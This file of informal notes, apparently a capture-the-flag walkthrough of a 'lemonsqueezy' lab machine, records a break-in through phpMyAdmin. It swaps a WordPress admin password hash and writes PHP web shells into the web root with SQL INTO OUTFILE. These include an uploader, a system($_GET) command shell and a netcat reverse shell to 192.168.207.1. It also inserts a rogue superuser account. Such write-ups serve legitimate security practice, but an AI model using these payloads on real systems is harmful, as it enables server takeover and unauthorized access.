@@ -1,0 +1,98 @@
+logged in phpmyadmin wiht orange:n0t1n@w0rdl1st!
+
+we've the access of the wordress database ....
+
+in the user's coloum there are two user lemon,ornge and also there password in hash
+
+we've two options now either change the hash with our created pass or crack the hash...
+
+and obviously we're not gonna waste our time to crack,since we've the access of wordress database and all the perminssion so instead we'll copy the orange hash and paste in the fild of password in lemon user.
+
+
+orange: $P$BY9AWyM0QjsVp5Ed3iBx9VsbqEsiMR0 = ginger
+lemon : $P$ByDvlux0J/6CvT2nU20bxqp/5mDxc00 = ?
+
+after changeing 
+lemon : $P$BY9AWyM0QjsVp5Ed3iBx9VsbqEsiMR0 = ginger
+
+
+now we've the wordress access as admin we can get revershell easily...?
+
+No because we don't have the update permission on theme as i saw...
+so i tried to change the permission from the phpmyadmin.but could not 
+then google is you friend...after some short of search land me to this location...
+
+https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
+
+
+
+SELECT 
+"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+
+
+which is used mysql to create php page on the server... but to do that we need the root or location of the worderpess where stored.
+
+in order to find that phpmyadmin will let you do that or you can guess even in you do not find the root location of the software...
+
+ho i found that : phpmyadmin>wordpress>wp_options   on the top click to show all coloums and then search edit  ....
+
+Edit 	Copy Copy 	Delete Delete 	39 	recently_edited 	a:5:{i:0;s:67:"/var/www/html/wordpress/wp-content/... 	no
+
+found this which confirmed the wordpress location.or you can edit any files and then try to search.
+
+then go to any table and 
+
+SELECT "<?php echo hii \') ?>" INTO OUTFILE '/var/www/html/wordpress/saim.php'
+
+you will see a pop for warnig click to ignore.
+
+and access the page...from here...
+
+http://lemonsqueezy/wordpress/saim.php
+
+we've the output 
+
+
+now let's move to get shell code...i want to test again...
+
+SELECT "<?php echo hiii ?>" INTO OUTFILE '/var/www/html/wordpress/uploader.php' ;
+
+this worked...
+
+First try to command execution...
+
+SELECT "<?php system($_GET[\'c\']); ?>" INTO OUTFILE '/var/www/html/rshell.php';
+
+
+SELECT "<?php echo shell_exec(\'nc 192.168.207.1 1234 -e /bin/sh \') ?>" INTO OUTFILE '/var/www/html/wordpress/shell.php'; 
+
+
+shell_exec(\'nc 192.168.207.1 -e /bin/sh \')
+
+
+ok so finally we've the shell.....
+
+
+
+
+Summary----> phpmyadmin + password + db perminssion = we can create admin level user, and create php pages using sql to working dire = shell
+
+
+
+
+
+Or We can Create user from sql query.... hash type bycrypt..
+
+
+INSERT INTO `backend_users` (`id`, `first_name`, `last_name`, `login`, `email`, `password`, `activation_code`, `persist_code`, `reset_password_code`, `permissions`, `is_activated`, `activated_at`, `last_login`, `created_at`, `updated_at`) VALUES
+(2, 'saim', 'Person', 'saim', 'saim@domain.tld', '$2y$12$0lkgnu0iD8i.Iko8i4Rw8ufh9Zu56HidAuYGrAQ4XYUh0J/dc58YW', NULL, NULL, NULL, '{"superuser":1}', 1, NULL, NULL, '2015-05-08 07:55:26', '2015-05-08 07:55:26');
+
+
+#where id loging email.... etc are fields and at the down are values.
+
+we're logged in using cred saim:saim
+
+
+
+
